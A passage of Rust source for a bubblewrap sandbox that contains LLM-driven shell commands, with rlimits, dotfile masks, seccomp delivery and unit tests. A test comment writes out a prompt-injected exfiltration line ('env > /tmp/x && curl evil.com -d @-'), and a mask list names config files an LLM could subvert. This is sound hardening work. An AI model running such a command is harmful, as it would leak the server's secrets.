    let mut argv = build_hardening_prefix(&HardeningArgvParams {
        caps,
        rootfs_dir,
        passwd_path,
        group_path,
        mask_path,
        home_bind_source: &ctx.workspace,
        seccomp_fd,
        extra_setenv: &[],
        extra_ro_binds: &all_ro_binds,
        extra_rw_binds: &extra_workflow_rw,
        progress_fifo_src,
    });

    // Wrap user code in `prlimit` so per-call rlimits apply to the
    // workload, not to bwrap's own helper forks (validated: setting
    // rlimits on bwrap itself starves bwrap). Values are
    // runtime-configurable via the `code_sandbox_settings` singleton.
    argv.push("/usr/bin/prlimit".into());
    argv.push(format!("--nproc={}", limits.nproc_max));
    argv.push(format!("--as={}", limits.address_space_bytes));
    argv.push(format!("--fsize={}", limits.fsize_bytes));
    argv.push(format!("--nofile={}", limits.nofile_max));
    argv.push("--core=0".into());
    argv.push(format!("--cpu={}", limits.cpu_secs_max));
    argv.push("--".into());
    argv.push("/bin/bash".into());
    argv.push("-lc".into());
    argv.push(user_cmd.to_string());

    argv
}


/// Per-file workspace path for a conversation attachment.
/// Files are staged under `<workspace_root>/attachments/<file_id>` by
/// the handler before bwrap fires, so the bind is read-only-safe.
pub fn workspace_attachment_path(workspace_root: &Path, file_id: Uuid) -> PathBuf {
    workspace_root.join("attachments").join(file_id.to_string())
}

// --------------------------------------------------------------------
// Synthetic passwd / group (per-call, lives inside the workspace,
// bind-mounted read-only over /etc/passwd /etc/group)
// --------------------------------------------------------------------

pub(crate) struct SyntheticIdentity {
    passwd: PathBuf,
    group: PathBuf,
    /// Empty regular file used as the bind source for the DANGEROUS_DOTFILES
    /// masks. Must be a normal file, NOT `/dev/null` — bwrap's `--ro-bind`
    /// passes through `nodev` and bash's `open()` of a character device on a
    /// `nodev` mount returns EACCES, which bash surfaces as "Permission
    /// denied" when sourcing `.bash_profile`. A 0-byte regular file reads
    /// cleanly (zero bytes, EOF) and writes still fail with EROFS.
    mask_path: PathBuf,
}

// pub(crate) so the WSL2 backend can provision identical synthetic identity
// files inside the imported distro (the macOS guest root bakes them in).
pub(crate) const SYNTHETIC_PASSWD: &str =
    "sandboxuser:x:1001:1001:Sandbox User:/home/sandboxuser:/bin/bash\n";
pub(crate) const SYNTHETIC_GROUP: &str = "sandboxuser:x:1001:\n";

/// Shell / runtime config files at the workspace root that an LLM-driven sandbox
/// command must NOT be able to read or write. Mirrors Anthropic sandbox-runtime's
/// `DANGEROUS_FILES` list (`src/sandbox/sandbox-utils.ts:11-22`). Each one is
/// either a shell-startup file (`.bashrc`, `.zshrc`, `.profile`, …) that the
/// host shell could source on next login, or a tool-config file (`.gitconfig`,
/// `.mcp.json`, …) that the LLM could subvert to alter outside-sandbox behavior
/// (e.g. credential helpers, MCP server URLs). Masking with `--ro-bind /dev/null`
/// makes every read appear empty AND every write fail with EROFS, regardless of
/// whether the file already exists in the workspace.
const DANGEROUS_DOTFILES: &[&str] = &[
    ".gitconfig",
    ".gitmodules",
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".profile",
    ".ripgreprc",
    ".mcp.json",
];

impl SyntheticIdentity {
    /// Lazily ensure the synthetic passwd/group files exist under
    /// `<workspace_root>/identity/` and return their paths.
    ///
    /// SECURITY: identity files live OUTSIDE the per-conversation
    /// workspace bind. The earlier implementation wrote them into
    /// `<workspace>/.sandbox_passwd`, which had two problems:
    ///   1. Two concurrent calls in the same conversation raced on the
    ///      write (mitigated by the per-conv mutex, but still fragile).
    ///   2. A user who did `write_file(".sandbox_passwd", payload)`
    ///      would have their data silently clobbered by the next
    ///      execute_command — surprising and a small data-loss vector.
    /// Moving the files to `<workspace_root>/identity/` makes them
    /// per-process (shared by every conversation) and the content is
    /// constant, so the write is idempotent: we only write if the
    /// file doesn't already exist or has the wrong content.
    fn ensure(workspace_root: &Path) -> Result<Self, AppError> {
        let identity_dir = workspace_root.join("identity");
        std::fs::create_dir_all(&identity_dir).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_INIT_FAILED",
                format!("mkdir identity dir: {e}"),
            )
        })?;
        let passwd = identity_dir.join("passwd");
        let group = identity_dir.join("group");
        write_if_changed(&passwd, SYNTHETIC_PASSWD).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic passwd: {e}"),
            )
        })?;
        write_if_changed(&group, SYNTHETIC_GROUP).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic group: {e}"),
            )
        })?;
        let mask_path = identity_dir.join("empty");
        write_if_changed(&mask_path, "").map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write empty mask file: {e}"),
            )
        })?;
        Ok(Self { passwd, group, mask_path })
    }

    fn passwd_path(&self) -> &Path {
        &self.passwd
    }
    fn group_path(&self) -> &Path {
        &self.group
    }
    fn mask_path(&self) -> &Path {
        &self.mask_path
    }

    // Crate-public accessors exposed so the MCP-in-sandbox spawn path
    // (`build_mcp_sandbox_command`) can build a `HardeningArgvParams`
    // without redeclaring the identity-file ownership.
    pub(crate) fn ensure_for(workspace_root: &Path) -> Result<Self, AppError> {
        Self::ensure(workspace_root)
    }
    pub(crate) fn passwd(&self) -> &Path { &self.passwd }
    pub(crate) fn group(&self) -> &Path { &self.group }
    pub(crate) fn mask(&self) -> &Path { &self.mask_path }
}

/// Write `content` to `path` only if the file doesn't already exist
/// or has different content. Avoids redundant disk writes on every
/// sandbox call.
fn write_if_changed(path: &Path, content: &str) -> std::io::Result<()> {
    match std::fs::read_to_string(path) {
        Ok(existing) if existing == content => Ok(()),
        _ => std::fs::write(path, content),
    }
}

// --------------------------------------------------------------------
// Seccomp pipe (per-call). Bytes are precompiled at boot; we just
// shuttle them to a fd that bwrap reads via `--seccomp <fd>`.
// --------------------------------------------------------------------

/// Outcome of shuttling the precompiled BPF program into the seccomp pipe.
#[cfg(target_os = "linux")]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SeccompWriteOutcome {
    /// All bytes delivered — bwrap loads the full filter.
    Complete,
    /// The reader (the bwrap child) closed the pipe before consuming the filter
    /// (EPIPE / errno 32). The child has already exited, so the call fails at
    /// spawn and bwrap reports the real cause. A partial filter is REJECTED by
    /// bwrap, never loaded, so this is NOT a hardening bypass. Routine on the
    /// MCP-in-sandbox path when a junk stdio server's bwrap child exits before
    /// reading the fd.
    ChildGone,
    /// A genuine short write / unexpected EOF from a NON-EPIPE cause — the
    /// hardening claim 'seccomp: on' really was not delivered. Stays loud.
    Truncated,
}

/// Classify a finished seccomp-pipe write. Pure, so the EPIPE-vs-genuine split
/// is unit-testable without spawning bwrap. The distinction is the whole point
/// of the defect fix: a routine child-exited-early EPIPE must not be logged with
/// security-incident wording, while a real truncation must stay loud.
#[cfg(target_os = "linux")]
fn classify_seccomp_write(
    offset: usize,
    total: usize,
    last_err: Option<i32>,
) -> SeccompWriteOutcome {
    if offset >= total {
        SeccompWriteOutcome::Complete
    } else if last_err == Some(libc::EPIPE) {
        SeccompWriteOutcome::ChildGone
    } else {
        SeccompWriteOutcome::Truncated
    }
}

#[cfg(target_os = "linux")]
pub(crate) struct SeccompPipe {
    read_fd: RawFd,
    /// Stable fd number we dup2 the read end to inside the bwrap child
    /// in pre_exec. We pick fd 7 (out of stdio range, plausibly free).
    target_fd: i32,
}

#[cfg(target_os = "linux")]
impl SeccompPipe {
    fn install(bpf: Arc<Vec<u8>>) -> Result<Self, AppError> {
        // pipe(2) via libc — nix would be cleaner but we avoid the dep
        // here to keep the surface small.
        let mut fds: [libc::c_int; 2] = [0; 2];
        let ret = unsafe { libc::pipe2(fds.as_mut_ptr(), libc::O_CLOEXEC) };
        if ret < 0 {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "SECCOMP_PIPE_FAILED",
                format!("pipe2: {}", std::io::Error::last_os_error()),
            ));
        }
        let read_fd = fds[0];
        let write_fd = fds[1];

        // Push the BPF bytes from a tokio task so we don't deadlock if
        // they're bigger than the kernel pipe buffer (unlikely at <1KB
        // but cheap insurance).
        //
        // SECURITY: write must succeed in full. A short write (or
        // EINTR-interrupted partial write) would feed bwrap a
        // truncated BPF program, which libseccomp rejects → bwrap
        // exits non-zero. Worse: an undetected partial write at the
        // boundary could conceivably load a smaller filter that
        // blocks fewer syscalls than the planner intended. Loop on
        // EINTR / EAGAIN; on any other error or unexpected EOF
        // (write returned 0), log loudly so operators see the
        // hardening claim was not delivered for that call.
        let total = bpf.as_ref().len();
        tokio::spawn(async move {
            let bytes: &[u8] = bpf.as_ref();
            let mut offset = 0;
            let mut last_err: Option<i32> = None;
            while offset < bytes.len() {
                let n = unsafe {
                    libc::write(
                        write_fd,
                        bytes[offset..].as_ptr() as *const libc::c_void,
                        bytes.len() - offset,
                    )
                };
                if n > 0 {
                    offset += n as usize;
                    continue;
                }
                // n <= 0: either error or kernel said "no more room",
                // which on a pipe write means the reader closed —
                // unexpected for our use case.
                let errno = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
                if n < 0 && (errno == libc::EINTR || errno == libc::EAGAIN) {
                    continue;
                }
                last_err = Some(errno);
                break;
            }
            unsafe {
                libc::close(write_fd);
            }
            match classify_seccomp_write(offset, total, last_err) {
                SeccompWriteOutcome::Complete => {}
                SeccompWriteOutcome::ChildGone => {
                    // The bwrap child closed the read end before consuming the
                    // filter. It has already exited, so the call fails at spawn
                    // and bwrap reports the real cause. NOT a hardening bypass
                    // (a partial filter is rejected, never loaded). Routine on
                    // the MCP-in-sandbox path — a junk stdio server's child
                    // exits before reading the fd — so log quietly, not at ERROR
                    // with security-incident wording.
                    tracing::debug!(
                        written = offset,
                        expected = total,
                        "code_sandbox: sandboxed child closed the seccomp pipe \
                         before reading the filter (EPIPE); the child exited \
                         early so this call fails at spawn — this is NOT a \
                         seccomp hardening bypass (bwrap rejects a partial \
                         filter, it never loads one)"
                    );
                }
                SeccompWriteOutcome::Truncated => {
                    tracing::error!(
                        written = offset,
                        expected = total,
                        errno = ?last_err,
                        "code_sandbox: seccomp BPF write was truncated; \
                         bwrap will reject the filter and the sandboxed \
                         call WILL FAIL — hardening claim 'seccomp: on' \
                         was not delivered for this call"
                    );
                }
            }
        });

        Ok(Self {
            read_fd,
            target_fd: 7,
        })
    }

    fn read_fd(&self) -> RawFd {
        self.read_fd
    }
    fn target_fd(&self) -> i32 {
        self.target_fd
    }

    // Crate-public accessors used by the MCP-in-sandbox spawn path.
    // Keep the original `read_fd` / `target_fd` private so refactors of
    // the one-shot exec path don't accidentally expose new surface.
    pub(crate) fn install_pub(bpf: Arc<Vec<u8>>) -> Result<Self, AppError> {
        Self::install(bpf)
    }
    pub(crate) fn read_fd_pub(&self) -> RawFd { self.read_fd }
    pub(crate) fn target_fd_pub(&self) -> i32 { self.target_fd }
}

#[cfg(target_os = "linux")]
impl Drop for SeccompPipe {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.read_fd);
        }
    }
}

// --------------------------------------------------------------------
// Live-progress FIFO (per-call; workflow sandbox step only). The HOST
// owns the FIFO on the Linux backend (bwrap runs on the host): create the
// named pipe, bind it onto `/ziee/progress` in the sandbox via the argv,
// and read it host-side, forwarding each newline-trimmed line (one raw
// FIFO `write()` under PIPE_BUF) to `progress_tx`. Mirrors the VM-side
// reader the guest agent runs (which forwards via `Frame::ProcessProgress`).
//
// TODO(linux-verify): this whole `linux_bwrap` host path is
// `#[cfg(target_os = "linux")]`, so it is NOT compiled by the macOS dev
// host's `cargo check` and NOT exercised by macOS tests. It has only been
// reviewed by eye + type-checked via a (reverted) temporary cfg relaxation.
// Before relying on the bwrap progress path in production it MUST get a real
// Linux build + a Tier-4/6 sandbox test (CI runs on Linux). Open items to
// confirm on Linux: (1) bwrap auto-creates the `/ziee/progress` mountpoint +
// `/ziee` parent for a `--bind` whose SOURCE is a FIFO (vs a regular file);
// (2) the `O_RDWR` writer-ref keeps the read end from EOF-ing between the
// sandbox's per-`echo` open/close cycles under bwrap's user-ns mapping.
// macOS (`mac_vm`) is the path verifiable on THIS machine (agent FIFO over
// vsock); focus verification there first.
// --------------------------------------------------------------------

#[cfg(target_os = "linux")]
pub(crate) struct ProgressFifo {
    fifo_path: PathBuf,
    fifo_path_str: String,
    stop: Arc<std::sync::atomic::AtomicBool>,
    reader: Option<tokio::task::JoinHandle<()>>,
}

#[cfg(target_os = "linux")]
impl ProgressFifo {
    /// Create the FIFO + spawn the reader task. The FIFO lives under the
    /// process temp dir (a host-local fs) at a per-conversation-unique path;
    /// `mkfifo` mode 0600 so only the server uid can open it (the sandboxed
    /// uid 1001 reaches it only through the bwrap `--bind`, which preserves
    /// the bind-source perms but runs as the same kernel user namespace
    /// mapping — the workspace bind already grants write).
    fn spawn(
        conversation_id: Uuid,
        tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
    ) -> Result<Self, AppError> {
        use std::os::unix::ffi::OsStrExt;

        // Unique name: pid + conversation_id avoids collisions across
        // concurrent execs / processes sharing the temp dir.
        let fifo_path = std::env::temp_dir().join(format!(
            "ziee-progress-{}-{}.fifo",
            std::process::id(),
            conversation_id
        ));
        // Best-effort unlink of any stale FIFO at this path (a prior crash).
        let _ = std::fs::remove_file(&fifo_path);

        let c_path = std::ffi::CString::new(fifo_path.as_os_str().as_bytes())
            .map_err(|e| AppError::internal_error(format!("progress FIFO path: {e}")))?;
        // SAFETY: c_path is a valid NUL-terminated CString living for the call.
        if unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) } < 0 {
            return Err(AppError::internal_error(format!(
                "mkfifo {}: {}",
                fifo_path.display(),
                std::io::Error::last_os_error()
            )));
        }

        // Open the read end with O_RDWR (NOT O_RDONLY): holding our own writer
        // reference means the read end never observes EOF when the sandbox's
        // writers come and go between lines — the reader stays alive across
        // multiple `echo > $ZIEE_PROGRESS` invocations and only ends when we
        // signal stop on drop. O_NONBLOCK + AsyncFd gives readiness-driven
        // async reads; O_CLOEXEC so the fd doesn't leak into the bwrap child
        // (bwrap reaches the FIFO via the `--bind` path, not an inherited fd).
        // SAFETY: open with a valid path; returns -1 on error (checked).
        let fd = unsafe {
            libc::open(
                c_path.as_ptr(),
                libc::O_RDWR | libc::O_NONBLOCK | libc::O_CLOEXEC,
            )
        };
        if fd < 0 {
            let err = std::io::Error::last_os_error();
            let _ = std::fs::remove_file(&fifo_path);
            return Err(AppError::internal_error(format!(
                "open progress FIFO {}: {err}",
                fifo_path.display()
            )));
        }

        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let stop_reader = stop.clone();
        // SAFETY: we own `fd` (just opened, O_CLOEXEC, O_NONBLOCK) and hand it
        // to the reader task, which closes it via AsyncFd::Drop on exit.
        let owned = unsafe { <std::os::fd::OwnedFd as std::os::fd::FromRawFd>::from_raw_fd(fd) };
        let reader = tokio::spawn(progress_reader_loop(owned, tx, stop_reader));

        let fifo_path_str = fifo_path.to_string_lossy().into_owned();
        Ok(Self {
            fifo_path,
            fifo_path_str,
            stop,
            reader: Some(reader),
        })
    }

    /// The host FIFO path the bwrap argv `--bind`s onto `/ziee/progress`.
    fn fifo_path_str(&self) -> &str {
        &self.fifo_path_str
    }
}

#[cfg(target_os = "linux")]
impl Drop for ProgressFifo {
    fn drop(&mut self) {
        // Signal the reader to stop, then abort it (it's parked on readiness;
        // abort is the prompt teardown). The AsyncFd closes the held fd.
        self.stop.store(true, std::sync::atomic::Ordering::SeqCst);
        if let Some(h) = self.reader.take() {
            h.abort();
        }
        // Unlink the FIFO (no orphaned pipe on disk).
        let _ = std::fs::remove_file(&self.fifo_path);
    }
}

/// Read newline-delimited progress lines off the FIFO fd and forward each
/// (newline-trimmed) line to `tx`. A single FIFO `write()` under PIPE_BUF is
/// atomic, so lines don't interleave; lines longer than
/// [`sandbox_vm_protocol::PROGRESS_MAX_LINE_BYTES`] are DROPPED (a torn/over-cap
/// write can't be trusted). Ends when `stop` is set (task is aborted on drop)
/// or `tx` is closed (consumer gone).
#[cfg(target_os = "linux")]
async fn progress_reader_loop(
    fd: std::os::fd::OwnedFd,
    tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
    stop: Arc<std::sync::atomic::AtomicBool>,
) {
    use std::os::fd::AsRawFd;
    use tokio::io::unix::AsyncFd;

    let async_fd = match AsyncFd::new(fd) {
        Ok(a) => a,
        Err(e) => {
            tracing::warn!("progress reader: AsyncFd::new failed: {e}");
            return;
        }
    };

    // Accumulator for partial lines across reads. Bounded so a writer that
    // never emits a newline can't grow it unboundedly — once it exceeds the
    // per-line cap we discard until the next newline.
    let mut pending: Vec<u8> = Vec::with_capacity(256);
    let mut overflowed = false;
    let mut buf = [0u8; 8 * 1024];

    loop {
        if stop.load(std::sync::atomic::Ordering::SeqCst) || tx.is_closed() {
            return;
        }
        let mut guard = match async_fd.readable().await {
            Ok(g) => g,
            Err(_) => return,
        };
        // Drain everything currently readable.
        loop {
            let raw = async_fd.get_ref().as_raw_fd();
            // SAFETY: raw is a valid fd owned by `async_fd`; buf is a valid
            // mutable buffer of `buf.len()` bytes.
            let n = unsafe {
                libc::read(raw, buf.as_mut_ptr() as *mut libc::c_void, buf.len())
            };
            if n > 0 {
                let chunk = &buf[..n as usize];
                for &byte in chunk {
                    if byte == b'\n' {
                        if !overflowed && !pending.is_empty() {
                            // One complete line. Forward a copy; the consumer
                            // owns it. Ignore send errors (consumer gone → the
                            // top-of-loop `tx.is_closed()` ends us next pass).
                            let _ = tx.send(std::mem::take(&mut pending));
                        } else {
                            pending.clear();
                        }
                        overflowed = false;
                    } else if !overflowed {
                        pending.push(byte);
                        if pending.len() > sandbox_vm_protocol::PROGRESS_MAX_LINE_BYTES {
                            // Over the atomic-write cap → can't trust this
                            // line; drop until the next newline.
                            pending.clear();
                            overflowed = true;
                        }
                    }
                }
                continue;
            }
            if n == 0 {
                // EOF — can't happen while we hold the O_RDWR writer ref, but
                // treat defensively as "no more for now".
                guard.clear_ready();
                break;
            }
            // n < 0: EAGAIN means drained; anything else, stop reading this
            // readiness cycle and re-await.
            let errno = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
            if errno == libc::EAGAIN || errno == libc::EWOULDBLOCK {
                guard.clear_ready();
                break;
            }
            if errno == libc::EINTR {
                continue;
            }
            tracing::warn!("progress reader: read errno {errno}; ending");
            return;
        }
    }
}

// --------------------------------------------------------------------
// Capped stdout/stderr capture.
// --------------------------------------------------------------------

async fn read_capped_owned<R: AsyncRead + Unpin + Send + 'static>(
    mut reader: R,
) -> (Vec<u8>, bool) {
    let mut buf = Vec::with_capacity(8 * 1024);
    let mut chunk = [0u8; 8 * 1024];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => {
                if buf.len() + n > OUTPUT_CAP_BYTES {
                    let remain = OUTPUT_CAP_BYTES - buf.len();
                    buf.extend_from_slice(&chunk[..remain]);
                    truncated = true;
                    // Drain the rest so the writer doesn't block forever.
                    while reader.read(&mut chunk).await.unwrap_or(0) > 0 {}
                    break;
                }
                buf.extend_from_slice(&chunk[..n]);
            }
            Err(_) => break,
        }
    }
    (buf, truncated)
}

fn lossy_string_with_marker(buf: Vec<u8>, truncated: bool) -> String {
    let mut s = String::from_utf8_lossy(&buf).into_owned();
    if truncated {
        s.push_str(&format!(
            "\n[output truncated at {} bytes]\n",
            OUTPUT_CAP_BYTES
        ));
    }
    s
}

fn preview(s: &str, n: usize) -> &str {
    let end = s.char_indices().nth(n).map(|(i, _)| i).unwrap_or(s.len());
    &s[..end]
}

// Re-export so non-sandbox callers don't need to touch RawFd directly.
#[cfg(target_os = "linux")]
pub use std::os::fd::FromRawFd;

// Trait imports used above but otherwise unused locally — keep the
// imports honest in -Dwarnings builds.
#[cfg(target_os = "linux")]
fn _force_fd_imports(f: std::fs::File) -> RawFd {
    let fd = f.as_raw_fd();
    let _: std::fs::File = unsafe { std::fs::File::from_raw_fd(fd) };
    
    unsafe { std::fs::File::from_raw_fd(fd) }.into_raw_fd()
}

// =====================================================================
// Tier 1 unit tests — argv builder + output cap
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sandbox_config::CodeSandboxConfig;
    use crate::models::ConversationFile;
    use std::path::PathBuf;
    use std::sync::Arc;
    use uuid::Uuid;

    fn fake_caps() -> HardeningCapabilities {
        HardeningCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            pid_namespace: PidNsMode::Strict,
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    fn fake_host_caps() -> crate::types::HostCapabilities {
        crate::types::HostCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    /// No-op provider stubs. These Tier-1 tests exercise pure-Rust
    /// argv-builder paths only (they read `state.config` / `state.host_caps` /
    /// `state.workspace_root`), never invoking a provider seam, so every method
    /// is `unreachable!()` except the trivial `cache_dir` / `shutdown`.
    struct TestProviders;

    #[async_trait::async_trait]
    impl crate::provider::RootfsProvider for TestProviders {
        async fn ensure_rootfs_ready(
            &self,
            _flavor: &str,
        ) -> Result<crate::provider::EnsureOutcome, AppError> {
            unreachable!("argv tests never mount")
        }
        fn cache_dir(&self) -> PathBuf {
            PathBuf::from("/tmp")
        }
        async fn evict_by_version_flavor(
            &self,
            _version_cache_dir: &std::path::Path,
            _version: &str,
            _flavor: &str,
        ) -> crate::provider::EvictOutcome {
            unreachable!("argv tests never evict")
        }
        async fn ensure_fetched(
            &self,
            _cache_dir: &std::path::Path,
            _flavor: &str,
            _progress: Box<dyn Fn(crate::provider::FetchProgress) + Send + Sync>,
        ) -> Result<crate::provider::FetchOutcome, crate::provider::FetchError> {
            unreachable!("argv tests never fetch")
        }
        async fn ensure_fetched_format(
            &self,
            _cache_dir: &std::path::Path,
            _flavor: &str,
            _format: crate::provider::RootfsFormat,
            _progress: Box<dyn Fn(crate::provider::FetchProgress) + Send + Sync>,
        ) -> Result<crate::provider::FetchOutcome, crate::provider::FetchError> {
            unreachable!("argv tests never fetch")
        }
        async fn shutdown(&self) {}
    }

    #[async_trait::async_trait]
    impl crate::provider::ResourceLimitsProvider for TestProviders {
        async fn load_from_db(
            &self,
        ) -> Result<crate::resource_limits::CodeSandboxResourceLimits, AppError> {
            unreachable!("argv tests pass fake_limits() explicitly")
        }
    }

    impl crate::provider::GuestAgentProvider for TestProviders {
        fn ensure(&self) -> Result<&'static crate::provider::Extracted, String> {
            unreachable!("argv tests never stage the guest agent")
        }
        fn ensure_wsl2(&self) -> Result<&'static PathBuf, String> {
            unreachable!("argv tests never stage the guest agent")
        }
    }

    fn fake_state() -> CodeSandboxState {
        CodeSandboxState {
            config: CodeSandboxConfig {
                enabled: true,
                rootfs_path: Some("/opt/ziee-sandbox-rootfs/current".to_string()),
                cgroup_parent: String::new(),
                ..Default::default()
            },
            loopback_url: "http://127.0.0.1:8080/api/code-sandbox".to_string(),
            workspace_root: PathBuf::from("/tmp/ziee-workspace"),
            host_caps: fake_host_caps(),
            // Tests in this module exercise pure-Rust argv-builder paths only,
            // so the provider seams are no-op stubs.
            rootfs: Arc::new(TestProviders),
            limits: Arc::new(TestProviders),
            guest_agent: Arc::new(TestProviders),
        }
    }

    fn fake_ctx() -> SandboxContext {
        SandboxContext {
            conversation_id: Uuid::nil(),
            user_id: Uuid::nil(),
            workspace: PathBuf::from("/tmp/ws"),
            files: Arc::new(Vec::<ConversationFile>::new()),
            extra_ro_binds: Vec::new(),
        }
    }

    /// SQL-default-matching `CodeSandboxResourceLimits` for Tier-1 argv tests.
    /// Mirrors the migration-41 defaults so the prlimit assertions assert the
    /// same numbers the production server starts with on a fresh install.
    fn fake_limits() -> crate::resource_limits::CodeSandboxResourceLimits {
        use crate::resource_limits::CodeSandboxResourceLimits;
        let now = chrono::Utc::now();
        CodeSandboxResourceLimits {
            memory_max_bytes: 512 * 1024 * 1024,
            memory_swap_max_bytes: 0,
            pids_max: 256,
            cpu_max: "100000 100000".to_string(),
            address_space_bytes: 4 * 1024 * 1024 * 1024,
            fsize_bytes: 256 * 1024 * 1024,
            nproc_max: 256,
            nofile_max: 1024,
            cpu_secs_max: 1240,
            timeout_secs: 620,
            vm_idle_evict_secs: 900,
            mac_vm_vcpus: 2,
            mac_vm_ram_mib: 2048,
            vm_max_concurrent_execs: 3,
            created_at: now,
            updated_at: now,
        }
    }

    #[test]
    fn argv_clears_env_before_setenv() {
        // SECURITY regression test: --clearenv MUST appear before any
        // --setenv flag, so the server's full inherited environment
        // (DATABASE_URL, JWT secrets, every *_API_KEY) does not leak
        // into the sandboxed shell. Combined with --share-net, a
        // missing --clearenv would let a prompt-injected `env >
        // /tmp/x && curl evil.com -d @-` exfiltrate every secret the
        // server holds.
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );

        let clearenv = argv
            .iter()
            .position(|a| a == "--clearenv")
            .expect("bwrap argv must include --clearenv");
        let first_setenv = argv
            .iter()
            .position(|a| a == "--setenv")
            .expect("expected at least one --setenv (HOME/USER/PATH)");

        assert!(
            clearenv < first_setenv,
            "--clearenv must come BEFORE the first --setenv; argv: {argv:?}"
        );

        // Sanity: the safe locale/TERM defaults we added alongside
        // --clearenv are present so rootfs tools (R, matplotlib,
        // click) still start cleanly.
        for required in &["HOME", "USER", "PATH", "LANG", "LC_ALL", "TERM"] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing --setenv for {required}; argv: {argv:?}"
            );
        }
    }

    /// Find the value following `--setenv <key>` in a bwrap argv.
    fn setenv_value(argv: &[String], key: &str) -> Option<String> {
        argv.windows(3).find_map(|w| {
            (w[0] == "--setenv" && w[1] == key).then(|| w[2].clone())
        })
    }

    #[test]
    fn argv_sets_on_demand_install_layer_env() {
        // Feature #3, Part A: user-space installs persist across
        // execute_command calls only if the persistent $HOME prefixes are on
        // PATH and the package managers point at them. The dotfile mask hides
        // ~/.bashrc, so these --setenv lines (NOT shell init) are the
        // persistence mechanism.
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );

        // PATH prepends the three persistent bin dirs ahead of the rootfs dirs.
        let path_val = setenv_value(&argv, "PATH").expect("PATH --setenv present");
        assert!(
            path_val.starts_with(
                "/home/sandboxuser/.local/bin:/home/sandboxuser/.ziee/micromamba/bin:/home/sandboxuser/.ziee/npm/bin:"
            ),
            "PATH must prepend the persistent install bins; got: {path_val}"
        );
        assert!(
            path_val.contains("/usr/bin"),
            "PATH must still include the rootfs system dirs; got: {path_val}"
        );

        // The package-manager prefixes point at the persistent $HOME layer.
        assert_eq!(
            setenv_value(&argv, "MAMBA_ROOT_PREFIX").as_deref(),
            Some("/home/sandboxuser/.ziee/micromamba")
        );
        assert_eq!(setenv_value(&argv, "PIP_USER").as_deref(), Some("1"));
        assert_eq!(
            setenv_value(&argv, "PYTHONUSERBASE").as_deref(),
            Some("/home/sandboxuser/.local")
        );
        assert_eq!(
            setenv_value(&argv, "npm_config_prefix").as_deref(),
            Some("/home/sandboxuser/.ziee/npm")
        );
    }

    #[test]
    fn argv_always_terminates_user_input_with_dashdash() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(state.config.rootfs_path()),
            "echo hello",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            std::path::Path::new("/tmp/.sandbox_empty"),
            None,
            &fake_limits(),
            &[],
            None,
        );
        // There should be at least one `--` before the prlimit wrapper.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not in argv");
        let dashdash_before = argv[..prlimit_idx]
            .iter()
            .rposition(|a| a == "--")
            .expect("no -- before prlimit");
        // Nothing flag-like between the last `--` and prlimit (only
        // flag-like would be `--seccomp <fd>` which is correctly placed
        // before the `--`).
        assert!(prlimit_idx > dashdash_before);
    }

    /// HARDENING BYTE-IDENTICAL AUDIT (the `/lit` lift, Phase-2 seam).
    ///
    /// The former inline `crate::modules::lit_search::…` `/lit` bind was lifted
    /// out of this build-DB-free engine function into a caller-injected
    /// `ctx.extra_ro_binds`. This test pins the load-bearing equivalence: for a
    /// fixed input, the emitted argv is byte-identical to what the inline block
    /// produced — the `/lit` view is emitted as exactly
    /// `--ro-bind-try <host_view> /lit`, at the SAME position (after attachment
    /// RO binds, inside the `extra_ro_binds` loop), and NOTHING is emitted when
    /// the caller passes no extra binds (proving the inline computation is gone,
    /// not merely duplicated).
    #[test]
    fn lit_bind_lift_is_byte_identical() {
        let caps = fake_caps();
        let state = fake_state();

        let build = |ctx: &SandboxContext| {
            build_bwrap_argv(
                &caps,
                &state.workspace_root,
                ctx,
                std::path::Path::new(state.config.rootfs_path()),
                "echo hi",
